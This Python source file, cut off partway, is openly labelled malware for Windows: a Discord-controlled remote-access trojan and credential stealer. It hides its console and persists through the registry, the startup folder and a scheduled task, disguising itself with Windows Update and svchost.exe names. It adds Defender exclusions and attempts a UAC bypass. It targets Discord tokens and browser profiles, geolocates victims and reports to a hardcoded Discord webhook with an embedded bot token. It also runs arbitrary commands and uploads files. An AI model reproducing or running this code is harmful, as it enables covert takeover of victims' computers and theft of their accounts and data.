import os
if os.name != "nt":
    exit()
import subprocess
import sys
import json
import urllib.request
import urllib.parse
import re
import base64
import datetime
import socket
import tempfile
import time
import asyncio
import zipfile
import shutil
import uuid
import hashlib
import winreg
import ctypes
import random
import sqlite3
import csv
import io
import threading
import webbrowser

def install_dependencies():
    print("Installing dependencies...")
    
    modules = [
        ("pyautogui", "pyautogui"),
        ("PIL", "Pillow"),
        ("discord", "discord.py"),
        ("psutil", "psutil"),
        ("pyttsx3", "pyttsx3"),
        ("requests", "requests"),
        ("win32crypt", "pypiwin32"),
        ("Crypto.Cipher", "pycryptodome"),
        ("pywin32", "pywin32"),
        ("wmi", "wmi"),
    ]
    
    for module, pip_name in modules:
        try:
            __import__(module.split('.')[0] if '.' in module else module)
            print(f"✓ {module}")
        except ImportError:
            print(f"Installing {pip_name}...")
            try:
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", pip_name], 
                    stdout=subprocess.DEVNULL, 
                    stderr=subprocess.DEVNULL
                )
                print(f"✓ Successfully installed {pip_name}")
            except:
                print(f"✗ Failed to install {pip_name}")

install_dependencies()

try:
    import pyautogui
    from PIL import Image
    import discord
    from discord.ext import commands
    from discord import File, Embed, ui
    import psutil
    import requests
    import webbrowser
    import pyttsx3
    import win32crypt
    from Crypto.Cipher import AES
    import win32security
    import win32api
    import win32con
    print("All modules imported successfully")
except ImportError as e:
    print(f"Failed to import some modules: {e}")
    print("Some features may be limited.")

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        try:
            script = sys.argv[0]
            params = ' '.join([script] + sys.argv[1:])
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, params, None, 1
            )
            sys.exit(0)
        except:
            return False
    return True

def execute_admin_command(cmd):
    try:
        ps_command = f'Start-Process powershell -Verb RunAs -ArgumentList "-Command \\"{cmd}\\""'
        
        result = subprocess.run(['powershell', '-Command', ps_command], 
                              capture_output=True, text=True, shell=True, timeout=60)
        
        output = result.stdout + result.stderr
        if not output:
            output = "Command executed with admin privileges (no output)"
        
        if len(output) > 1500:
            output = output[:1500] + "...\n[Output truncated]"
        
        return f"```powershell\n$ {cmd}\n{output}\n```"
    except subprocess.TimeoutExpired:
        return f"❌ Command timed out after 60 seconds: {cmd}"
    except Exception as e:
        return f"❌ Error executing admin command: {str(e)}"

def run_powershell_as_admin(ps_command):
    try:
        if not is_admin():
            full_command = f'powershell -Command "{ps_command}"'
            result = subprocess.run(full_command, shell=True, capture_output=True, text=True, timeout=60)
        else:
            result = subprocess.run(['powershell', '-Command', ps_command], 
                                  capture_output=True, text=True, shell=True, timeout=60)
        
        output = result.stdout + result.stderr
        if not output:
            output = "PowerShell command executed (no output)"
        
        if len(output) > 1500:
            output = output[:1500] + "...\n[Output truncated]"
        
        return f"```powershell\n{ps_command}\n{output}\n```"
    except subprocess.TimeoutExpired:
        return f"❌ PowerShell command timed out after 60 seconds"
    except Exception as e:
        return f"❌ Error executing PowerShell: {str(e)}"

def bypass_uac(command):
    try:
        temp_file = os.path.join(tempfile.gettempdir(), f"bypass_{int(time.time())}.bat")
        
        with open(temp_file, 'w') as f:
            f.write(f'@echo off\n{command}\ndel "%~f0"')
        
        bypass_cmd = f'eventvwr.exe'
        
        result = subprocess.run(['powershell', '-Command', f'Start-Process "{temp_file}" -Verb RunAs'], 
                              capture_output=True, text=True, shell=True, timeout=60)
        
        return f"✅ UAC bypass attempted for command: {command}"
    except Exception as e:
        return f"❌ UAC bypass failed: {str(e)}"

BOT_TOKEN = "MTQ1NTIyMjI3NjM2OTk0MDUwMA.Gbf5Pv.sdE9IeBDF8sf0q-ZATMshjNuk88jMnwUaPafU4"
WEBHOOK_URL = 'https://discord.com/api/webhooks/1455223752609763338/SaUcPjxOqlgijXmGXlS6a5fT7Dl9AicHDo7JqkPeFvHUQIvB-EeXRcULgotxPgoUrr6v'
COMMAND_PREFIX = "$"

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")

PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data\\Default",
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default',
    'Discord PTB': ROAMING + '\\discordptb',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Chromium': LOCAL + '\\Chromium\\User Data\\Default',
    'Amigo': LOCAL + '\\Amigo\\User Data\\Default',
    'Torch': LOCAL + '\\Torch\\User Data\\Default',
    'Kometa': LOCAL + '\\Kometa\\User Data\\Default',
    'Orbitum': LOCAL + '\\Orbitum\\User Data\\Default',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data\\Default',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data\\Default',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data\\Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data\\Default',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

SOCIAL_MEDIA_DOMAINS = [
    'youtube.com', 'youtu.be', 'google.com', 'accounts.google.com',
    'instagram.com', 'facebook.com', 'fb.com', 'twitter.com', 'x.com',
    'tiktok.com', 'reddit.com', 'discord.com', 'twitch.tv',
    'linkedin.com', 'pinterest.com', 'snapchat.com', 'whatsapp.com',
    'telegram.org', 'web.telegram.org', 't.me', 'spotify.com', 'netflix.com',
    'amazon.com', 'microsoft.com', 'paypal.com', 'github.com'
]

def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def get_private_ip():
    try:
        hostname = socket.gethostname()
        return socket.gethostbyname(hostname)
    except:
        return "Unknown"

def send_startup_notification(user_data, is_new_user):
    try:
        location = user_data['location']
        maps_link = ""
        if 'lat' in location and 'lon' in location and location['lat'] != 0 and location['lon'] != 0:
            maps_link = f"\nGoogle Maps: https://www.google.com/maps?q={location['lat']},{location['lon']}"
        
        private_ip = get_private_ip()
        
        if is_new_user:
            title = "NEW DEVICE REGISTERED"
            description = "First time execution! A new device has been infected and is now under your control."
            color = 65280
            status_text = f"Status: First Time Registered"
            footer_icon = "🆕"
        else:
            title = "DEVICE IS ONLINE"
            description = "Device logged in again! The malware is active on an existing device."
            color = 16753920
            login_count = user_data.get('login_count', 1)
            status_text = f"Status: Online Again | Total Logins: {login_count}"
            footer_icon = "🔄"
        
        embed = {
            "embeds": [{
                "title": title,
                "description": description,
                "color": color,
                "fields": [
                    {"name": "User", "value": f"`{user_data['display_name']}`", "inline": True},
                    {"name": "Device ID", "value": f"`{user_data['id']}`", "inline": True},
                    {"name": "PC Name", "value": f"`{user_data['pc_name']}`", "inline": True},
                    {"name": "Private IP", "value": f"`{private_ip}`", "inline": True},
                    {"name": "Public IP", "value": f"`{location.get('ip', 'Unknown')}`", "inline": True},
                    {"name": "User SID", "value": f"`{user_data['system_info']['user_sid']}`", "inline": True},
                    {"name": "Location", "value": f"City: {location.get('city', 'Unknown')}\nRegion: {location.get('region', 'Unknown')}\nCountry: {location.get('country', 'Unknown')}{maps_link}", "inline": False},
                    {"name": "Fingerprint", "value": f"`{user_data['fingerprint'][:8]}...`", "inline": True},
                    {"name": "Time", "value": f"<t:{int(datetime.datetime.now().timestamp())}:T>", "inline": True},
                    {"name": status_text, "value": "Device registered successfully", "inline": False},
                ],
                "footer": {"text": f"{footer_icon} Bot Controller • Total Devices: {len(user_system.registered_users)}"},
                "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat()
            }]
        }
        
        urllib.request.urlopen(
            urllib.request.Request(WEBHOOK_URL, data=json.dumps(embed).encode('utf-8'), headers=getheaders(), method='POST'),
            timeout=10
        )
        
    except Exception as e:
        pass

def send_bot_started_notification():
    try:
        current_user = next((u for u in user_system.registered_users if u['id'] == user_system.current_user_id), None)
        if not current_user:
            return
        
        location = current_user['location']
        private_ip = get_private_ip()
        
        embed = {
            "embeds": [{
                "title": "Bot Started Successfully",
                "description": f"Bot is now online and ready.\n\nUser: {current_user['display_name']}\nID: `{current_user['id']}`",
                "color": 5763719,
                "fields": [
                    {"name": "Total Devices", "value": f"`{len(user_system.registered_users)}`", "inline": True},
                    {"name": "Online Now", "value": f"`{len([u for u in user_system.registered_users if u.get('is_online', False)])}`", "inline": True},
                    {"name": "PC Name", "value": f"`{current_user['pc_name']}`", "inline": True},
                    {"name": "Private IP", "value": f"`{private_ip}`", "inline": True},
                    {"name": "Public IP", "value": f"`{location.get('ip', 'Unknown')}`", "inline": True},
                    {"name": "User SID", "value": f"`{current_user['system_info']['user_sid']}`", "inline": True},
                ],
                "footer": {"text": f"Bot User: {bot.user.name} | Auto-starts on boot"},
                "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat()
            }]
        }
        urllib.request.urlopen(
            urllib.request.Request(WEBHOOK_URL, data=json.dumps(embed).encode('utf-8'), headers=getheaders(), method='POST'),
            timeout=10
        )
    except:
        pass

def send_token_notification(tokens):
    try:
        if not tokens:
            embed = {
                "embeds": [{
                    "title": "Token Scan Results",
                    "description": "No Discord tokens found on the device.",
                    "color": 16711680,
                    "footer": {"text": "Token Scanner"},
                    "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat()
                }]
            }
        else:
            current_user = next((u for u in user_system.registered_users if u['id'] == user_system.current_user_id), None)
            if not current_user:
                return
            
            location = current_user['location']
            private_ip = get_private_ip()
            
            embed = {
                "embeds": [{
                    "title": "Discord Tokens Found",
                    "description": f"Successfully extracted {len(tokens)} token(s)",
                    "color": 65280,
                    "fields": [
                        {"name": "User", "value": f"`{current_user['display_name']}`", "inline": True},
                        {"name": "PC Name", "value": f"`{current_user['pc_name']}`", "inline": True},
                        {"name": "Private IP", "value": f"`{private_ip}`", "inline": True},
                        {"name": "Public IP", "value": f"`{location.get('ip', 'Unknown')}`", "inline": True},
                        {"name": "User SID", "value": f"`{current_user['system_info']['user_sid']}`", "inline": True},
                        {"name": "Location", "value": f"{location.get('city', 'Unknown')}, {location.get('country', 'Unknown')}", "inline": True},
                        {"name": "Status", "value": f"Tokens found: {len(tokens)}", "inline": False}
                    ],
                    "footer": {"text": "Token Scanner"},
                    "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat()
                }]
            }
        
        urllib.request.urlopen(
            urllib.request.Request(WEBHOOK_URL, data=json.dumps(embed).encode('utf-8'), headers=getheaders(), method='POST'),
            timeout=10
        )
    except:
        pass

def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
            user32.ShowWindow(hwnd, 0)
    except:
        pass

def hide_file(filepath):
    try:
        subprocess.run(f'attrib +h +s +r "{filepath}"', shell=True, capture_output=True)
    except:
        pass

def add_to_startup_advanced():
    success_methods = []
    
    try:
        if getattr(sys, 'frozen', False):
            current_path = sys.executable
        else:
            current_path = os.path.abspath(sys.argv[0])
        
        malware_folder = os.path.join(os.getenv('APPDATA'), "Microsoft", "SystemData", "WindowsUpdate")
        os.makedirs(malware_folder, exist_ok=True)
        
        malware_path = os.path.join(malware_folder, "WindowsUpdateHelper.exe")
        if current_path.endswith('.py'):
            batch_content = f'''@echo off
start /B pythonw "{current_path}"
exit'''
            batch_path = os.path.join(malware_folder, "run.bat")
            with open(batch_path, 'w') as f:
                f.write(batch_content)
            malware_path = batch_path
        else:
            shutil.copy2(current_path, malware_path)
        
        hide_file(malware_path)
        hide_file(malware_folder)
        
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, f'"{malware_path}"')
            winreg.CloseKey(key)
            success_methods.append("Registry")
        except:
            pass
        
        try:
            startup_folder = os.path.join(
                os.getenv('APPDATA'), 
                "Microsoft", "Windows", "Start Menu", 
                "Programs", "Startup"
            )
            os.makedirs(startup_folder, exist_ok=True)
            
            vbs_script = os.path.join(startup_folder, "WindowsUpdate.vbs")
            vbs_content = f'''
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "{malware_path}", 0, False
Set WshShell = Nothing
'''
            with open(vbs_script, 'w') as f:
                f.write(vbs_content)
            hide_file(vbs_script)
            success_methods.append("Startup Folder")
        except:
            pass
        
        try:
            task_name = "WindowsUpdateService"
            cmd = f'schtasks /create /tn "{task_name}" /tr "{malware_path}" /sc onlogon /rl highest /f'
            subprocess.run(cmd, shell=True, capture_output=True)
            success_methods.append("Task Scheduler")
        except:
            pass
        
        return len(success_methods) > 0, success_methods
        
    except Exception as e:
        return False, []

def create_self_replicating_payload():
    try:
        current_exe = sys.argv[0]
        if current_exe.endswith('.py'):
            try:
                import PyInstaller.__main__
                temp_dir = tempfile.mkdtemp()
                PyInstaller.__main__.run([
                    '--onefile',
                    '--windowed',
                    '--name=WindowsUpdateHelper',
                    '--icon=NONE',
                    '--distpath=' + temp_dir,
                    current_exe
                ])
                compiled_exe = os.path.join(temp_dir, "WindowsUpdateHelper.exe")
                if os.path.exists(compiled_exe):
                    current_exe = compiled_exe
            except:
                pass
        
        locations = [
            os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "svchost.exe"),
            os.path.join(os.getenv('APPDATA'), "Microsoft", "WindowsUpdate", "wuauclt.exe"),
            os.path.join(os.getenv('WINDIR'), "System32", "Tasks", "WindowsUpdate", "update.exe"),
            os.path.join(os.getenv('PROGRAMDATA'), "Microsoft", "Windows Defender", "platform", "MsMpEng.exe")
        ]
        
        for location in locations:
            try:
                os.makedirs(os.path.dirname(location), exist_ok=True)
                shutil.copy2(current_exe, location)
                hide_file(location)
            except:
                continue
                
    except Exception as e:
        pass

def enhance_stealth():
    try:
        locations_to_exclude = [
            os.getenv('APPDATA') + "\\Microsoft",
            os.getenv('LOCALAPPDATA') + "\\Google",
            os.getenv('WINDIR') + "\\System32\\Tasks"
        ]
        
        for location in locations_to_exclude:
            try:
                subprocess.run(f'powershell -Command "Add-MpPreference -ExclusionPath \'{location}\'"', 
                             shell=True, capture_output=True)
            except:
                pass
                
    except:
        pass

class UserSystem:
    def __init__(self):
        self.registered_users = []
        self.current_user_id = None
        self.user_data_file = os.path.join(os.getenv('APPDATA'), "Microsoft", "SystemData", "user_config.dat")
        self.load_users()
    
    def load_users(self):
        try:
            if os.path.exists(self.user_data_file):
                with open(self.user_data_file, 'r', encoding='utf-8') as f:
                    self.registered_users = json.load(f)
                hide_file(self.user_data_file)
        except:
            self.registered_users = []
    
    def save_users(self):
        try:
            os.makedirs(os.path.dirname(self.user_data_file), exist_ok=True)
            with open(self.user_data_file, 'w', encoding='utf-8') as f:
                json.dump(self.registered_users, f, indent=2)
            hide_file(self.user_data_file)
        except:
         pass
    
    def generate_device_fingerprint(self):
        identifiers = []
        
        identifiers.append(os.getenv('COMPUTERNAME', 'UNKNOWN'))
        identifiers.append(os.getenv('USERNAME', 'UNKNOWN'))
        identifiers.append(self.get_sid())
        
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
            machine_guid, _ = winreg.QueryValueEx(key, "MachineGuid")
            winreg.CloseKey(key)
            identifiers.append(machine_guid)
        except:
            pass
        
        identifiers.append(str(uuid.getnode()))
        
        fingerprint_data = "_".join(filter(None, identifiers))
        fingerprint = hashlib.sha256(fingerprint_data.encode()).hexdigest()[:32].upper()
        
        return fingerprint
    
    def get_sid(self):
        try:
            username = win32api.GetUserName()
            domain = win32api.GetComputerName()
            sid, domain, type = win32security.LookupAccountName(domain, username)
            sid_string = win32security.ConvertSidToStringSid(sid)
            return sid_string
        except:
            try:
                result = subprocess.run(['whoami', '/user', '/fo', 'csv'], 
                                      capture_output=True, text=True, shell=True)
                if result.returncode == 0:
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if 'S-1-' in line:
                            parts = line.split(',')
                            for part in parts:
                                if part.startswith('S-1-'):
                                    return part.replace('"', '')
            except:
                return "S-1-5-21-UNKNOWN"
    
    def get_accurate_location(self):
        location_data = {}
        
        try:
            ip_services = [
                "https://api.ipify.org",
                "https://icanhazip.com",
                "https://ifconfig.me/ip",
                "https://checkip.amazonaws.com"
            ]
            
            for service in ip_services:
                try:
                    with urllib.request.urlopen(service, timeout=3) as response:
                        location_data['ip'] = response.read().decode().strip()
                        if location_data['ip']:
                            break
                except:
                    continue
            
            if 'ip' in location_data:
                geo_apis = [
                    f"http://ip-api.com/json/{location_data['ip']}",
                    f"https://ipinfo.io/{location_data['ip']}/json",
                ]
                
                for api in geo_apis:
                    try:
                        with urllib.request.urlopen(api, timeout=5) as response:
                            data = json.loads(response.read().decode())
                            
                            if 'ip-api.com' in api and data.get('status') == 'success':
                                location_data.update({
                                    'country': data.get('country', 'Unknown'),
                                    'country_code': data.get('countryCode', 'Unknown'),
                                    'region': data.get('regionName', 'Unknown'),
                                    'city': data.get('city', 'Unknown'),
                                    'lat': float(data.get('lat', 0)),
                                    'lon': float(data.get('lon', 0)),
                                    'isp': data.get('isp', 'Unknown')
                                })
                                break
                            elif 'ipinfo.io' in api:
                                loc = data.get('loc', '0,0').split(',')
                                location_data.update({
                                    'country': data.get('country', 'Unknown'),
                                    'region': data.get('region', 'Unknown'),
                                    'city': data.get('city', 'Unknown'),
                                    'lat': float(loc[0]) if len(loc) > 0 else 0,
                                    'lon': float(loc[1]) if len(loc) > 1 else 0,
                                    'isp': data.get('org', 'Unknown')
                                })
                                break
                    except:
                        continue
            
            return location_data
            
        except Exception as e:
            return {'error': str(e)}
    
    def generate_user_id(self, pc_name, user_sid):
        if pc_name and pc_name.strip():
            pc_first = pc_name.split()[0] if ' ' in pc_name else pc_name
            pc_first = pc_first.strip().upper()[:3]
        else:
            pc_first = "PC"
        
        if user_sid and user_sid.startswith('S-1-'):
            sid_parts = user_sid.split('-')
            if len(sid_parts) >= 2:
                sid_last = sid_parts[-1][-4:] if len(sid_parts[-1]) >= 4 else sid_parts[-1]
            else:
                sid_last = hashlib.md5(user_sid.encode()).hexdigest()[-4:].upper()
        else:
            sid_last = hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[-4:].upper()
        
        user_id = f"{pc_first}{sid_last}"
        return user_id
    
    def register_user(self):
        fingerprint = self.generate_device_fingerprint()
        
        existing_user = next((u for u in self.registered_users if u.get('fingerprint') == fingerprint), None)
        
        if existing_user:
            existing_user['last_seen'] = datetime.datetime.now().isoformat()
            existing_user['login_count'] = existing_user.get('login_count', 0) + 1
            existing_user['is_online'] = True
            existing_user['is_active'] = True
            self.current_user_id = existing_user['id']
            self.save_users()
            
            existing_user['location'] = self.get_accurate_location()
            
            return existing_user, False
        
        pc_name = os.getenv('COMPUTERNAME', 'Unknown-PC')
        username = os.getenv('USERNAME', 'Unknown-User')
        sid = self.get_sid()
        
        existing_sid_user = next((u for u in self.registered_users if u['system_info']['user_sid'] == sid), None)
        if existing_sid_user:
            existing_sid_user['last_seen'] = datetime.datetime.now().isoformat()
            existing_sid_user['login_count'] = existing_sid_user.get('login_count', 0) + 1
            existing_sid_user['is_online'] = True
            existing_sid_user['is_active'] = True
            self.current_user_id = existing_sid_user['id']
            self.save_users()
            
            existing_sid_user['location'] = self.get_accurate_location()
            
            return existing_sid_user, False
        
        user_id = self.generate_user_id(pc_name, sid)
        
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        system_info = {
            'pc_name': pc_name,
            'username': username,
            'user_sid': sid,
            'windows_user': os.getenv('USERNAME', 'Unknown'),
            'windows_domain': os.getenv('USERDOMAIN', 'Unknown'),
            'windows_profile': os.getenv('USERPROFILE', 'Unknown'),
            'processor_arch': os.getenv('PROCESSOR_ARCHITECTURE', 'Unknown'),
            'processor_id': os.getenv('PROCESSOR_IDENTIFIER', 'Unknown'),
            'os': os.getenv('OS', 'Windows_NT'),
            'local_ip': local_ip,
            'timestamp': datetime.datetime.now().isoformat()
        }
        
        location = self.get_accurate_location()
        
        user_data = {
            'id': user_id,
            'fingerprint': fingerprint,
            'pc_name': pc_name,
            'username': username,
            'display_name': f"{username}@{pc_name}",
            'system_info': system_info,
            'location': location,
            'registration_time': datetime.datetime.now().isoformat(),
            'first_seen': datetime.datetime.now().isoformat(),
            'last_seen': datetime.datetime.now().isoformat(),
            'login_count': 1,
            'is_online': True,
            'is_active': True,
            'selected': False,
            'tokens_found': 0,
            'passwords_found': 0,
            'cookies_found': 0,
            'last_ip': location.get('ip', 'Unknown')
        }
        
        self.current_user_id = user_id
        self.registered_users.append(user_data)
        self.save_users()
        
        return user_data, True
    
    def get_user_list(self):
        if not self.registered_users:
            return "No devices registered yet."
        
        user_list = []
        for i, user in enumerate(self.registered_users, 1):
            status = "🟢" if user.get('is_online', False) else "🔴"
            selected = "👑" if user.get('selected', False) else ""
            last_seen = datetime.datetime.fromisoformat(user['last_seen']).strftime('%H:%M') if 'last_seen' in user else "Unknown"
            login_count = user.get('login_count', 1)
            
            user_list.append(
                f"{i}. {status} {selected} **{user['display_name']}**\n"
                f"   ID: `{user['id']}`\n"
                f"   PC: `{user['pc_name']}`\n"
                f"   SID: `{user['system_info']['user_sid']}`\n"
                f"   {user['location'].get('city', 'Unknown')}, {user['location'].get('country', 'Unknown')}\n"
                f"   IP: `{user['location'].get('ip', 'Unknown')}`\n"
                f"   Last: {last_seen} | Logins: {login_count}"
            )
        
        return "\n\n".join(user_list)
    
    def select_user(self, user_id):
        for user in self.registered_users:
            user['selected'] = False
        
        user = next((u for u in self.registered_users if u['id'] == user_id), None)
        
        if user:
            user['selected'] = True
            user['last_seen'] = datetime.datetime.now().isoformat()
            user['is_online'] = True
            self.current_user_id = user_id
            self.save_users()
            return user
        
        return None

user_system = UserSystem()

def check_internet_connection():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=3)
        return True
    except OSError:
        return False

def speak_text(text):
    try:
        engine = pyttsx3.init()
        voices = engine.getProperty('voices')
        engine.setProperty('rate', 150)
        
        for voice in voices:
            if "english" in voice.name.lower() or "hindi" in voice.name.lower() or "en" in voice.id.lower():
                engine.setProperty('voice', voice.id)
                break
        
        engine.say(text)
        engine.runAndWait()
        return True
    except:
        return False

def open_url_in_browser(url):
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        webbrowser.open(url, new=2)
        return True, "URL opened successfully"
        
    except Exception as e:
        return False, f"Error: {str(e)}"

def open_url_stealthy(url):
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        try:
            edge_path = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
            if os.path.exists(edge_path):
                subprocess.Popen([edge_path, url, '--new-window', '--start-minimized'], 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return True, "URL opened in Edge (minimized)"
        except:
            pass
        
        webbrowser.open(url, new=2)
        return True, "URL opened"
        
    except Exception as e:
        return False, f"Error: {str(e)}"

def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        if not output:
            output = "Command executed successfully (no output)"
        
        if len(output) > 1500:
            output = output[:1500] + "...\n[Output truncated]"
        
        return f"```bash\n$ {cmd}\n{output}\n```"
    except subprocess.TimeoutExpired:
        return f"❌ Command timed out after 30 seconds: {cmd}"
    except Exception as e:
        return f"❌ Error: {str(e)}"

async def download_and_send_file(message, file_path, max_size_mb=50):
    try:
        if not os.path.exists(file_path):
            await message.channel.send(f"❌ File not found: `{file_path}`")
            return
        
        if os.path.isdir(file_path):
            await message.channel.send(f"Zipping directory: `{file_path}`")
            temp_dir = tempfile.gettempdir()
            zip_filename = os.path.join(temp_dir, f"{os.path.basename(file_path)}_zipped.zip")
            
            with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                file_count = 0
                for root, dirs, files in os.walk(file_path):
                    for file in files:
                        try:
                            file_full_path = os.path.join(root, file)
                            arcname = os.path.relpath(file_full_path, file_path)
                            zipf.write(file_full_path, arcname)
                            file_count += 1
                        except:
                            continue
            
            file_size = os.path.getsize(zip_filename)
            if file_size > max_size_mb * 1024 * 1024:
                await message.channel.send(f"❌ File too large: {file_size/(1024*1024):.1f}MB > {max_size_mb}MB limit")
                os.remove(zip_filename)
                return
            
            with open(zip_filename, 'rb') as f:
                await message.channel.send(
                    f"✅ Directory downloaded: `{os.path.basename(file_path)}.zip`\n"
                    f"Size: {file_size/(1024*1024):.1f}MB | Files: {file_count}",
                    file=File(f, filename=f"{os.path.basename(file_path)}.zip")
                )
            
            os.remove(zip_filename)
            
        else:
            file_size = os.path.getsize(file_path)
            if file_size > max_size_mb * 1024 * 1024:
                await message.channel.send(f"❌ File too large: {file_size/(1024*1024):.1f}MB > {max_size_mb}MB limit")
                return
            
            with open(file_path, 'rb') as f:
                await message.channel.send(
                    f"✅ File downloaded: `{os.path.basename(file_path)}`\n"
                    f"Size: {file_size/1024:.1f}KB",
                    file=File(f, filename=os.path.basename(file_path))
                )
                
    except PermissionError:
        await message.channel.send(f"❌ Permission denied: Cannot access `{file_path}`")
    except Exception as e:
        await message.channel.send(f"❌ Error: `{str(e)}`")

def list_directory(path="."):
    try:
        if not os.path.exists(path):
            return f"❌ Path does not exist: {path}"
        
        if path == ".":
            path = os.getcwd()
        
        files = []
        dirs = []
        
        for item in os.listdir(path):
            item_path = os.path.join(path, item)
            if os.path.isdir(item_path):
                dirs.append(f"📁 {item}")
            else:
                size = os.path.getsize(item_path)
                if size < 1024:
                    size_str = f"{size} B"
                elif size < 1024**2:
                    size_str = f"{size/1024:.1f} KB"
                elif size < 1024**3:
                    size_str = f"{size/(1024**2):.1f} MB"
                else:
                    size_str = f"{size/(1024**3):.1f} GB"
                files.append(f"📄 {item} ({size_str})")
        
        dirs.sort()
        files.sort()
        
        result = []
        result.append(f"📂 Current Directory: {path}")
        result.append(f"📊 Total: {len(dirs)} directories, {len(files)} files")
        result.append("")
        result.append("📁 Directories:")
        result.extend(dirs[:20])
        result.append("")
        result.append("📄 Files:")
        result.extend(files[:20])
        
        if len(dirs) > 20 or len(files) > 20:
            result.append(f"\nℹ️ Showing first 20 of each.")
        
        return "\n".join(result)
    except Exception as e:
        return f"❌ Error: {str(e)}"

def search_files(directory, pattern):
    try:
        if not os.path.exists(directory):
            return f"❌ Directory does not exist: {directory}"
        
        matches = []
        for root, dirs, files in os.walk(directory):
            for file in files:
                if pattern.lower() in file.lower():
                    file_path = os.path.join(root, file)
                    size = os.path.getsize(file_path)
                    if size < 1024:
                        size_str = f"{size} B"
                    elif size < 1024**2:
                        size_str = f"{size/1024:.1f} KB"
                    else:
                        size_str = f"{size/(1024**2):.1f} MB"
                    
                    rel_path = os.path.relpath(file_path, directory)
                    matches.append(f"📄 {rel_path} ({size_str})")
            
            if len(matches) > 50:
                matches = matches[:50]
                matches.append(f"\n📋 Found more than 50 files. Showing first 50.")
                break
        
        if matches:
            result = [f"🔍 Search results for '{pattern}' in {directory}:"]
            result.append(f"📊 Found {len(matches)} files:")
            result.extend(matches)
            return "\n".join(result)
        else:
            return f"❌ No files found matching '{pattern}' in {directory}"
    except Exception as e:
        return f"❌ Error searching files: {str(e)}"

def get_file_info(file_path):
    try:
        if not os.path.exists(file_path):
            return f"❌ File not found: {file_path}"
        
        stats = os.stat(file_path)
        size = stats.st_size
        
        if size < 1024:
            size_str = f"{size} bytes"
        elif size < 1024**2:
            size_str = f"{size/1024:.2f} KB"
        elif size < 1024**3:
            size_str = f"{size/(1024**2):.2f} MB"
        else:
            size_str = f"{size/(1024**3):.2f} GB"
        
        created = datetime.datetime.fromtimestamp(stats.st_ctime)
        modified = datetime.datetime.fromtimestamp(stats.st_mtime)
        
        info = [
